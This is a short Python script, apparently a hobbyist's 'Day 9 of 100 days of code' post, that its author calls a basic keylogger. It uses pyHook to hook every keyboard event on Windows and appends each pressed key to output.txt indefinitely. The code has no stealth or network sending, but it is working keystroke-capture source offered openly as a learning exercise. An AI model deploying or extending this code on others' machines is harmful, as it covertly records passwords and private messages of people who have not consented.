#welcome to Day 9 of my 100 days of codes
#Today I will be writing a very basic keyloging program in python
#
#follow me on twitter @_drjimoh


import pythoncom, pyHook



#defining keyboard event func

def onKeyBoardEvent(event):
	key = event.Key 
	with open('output.txt', 'a') as f:
		f.write(key)
		f.write(" ")
		f.close()
	return True

#define Hook manager instance 
hm = pyHook.HookManager()
#watching out for all key events
hm.KeyDown = onKeyBoardEvent
#hooking keys
hm.HookKeyboard() 
#keeping windows open till forever
pythoncom.PumpMessages()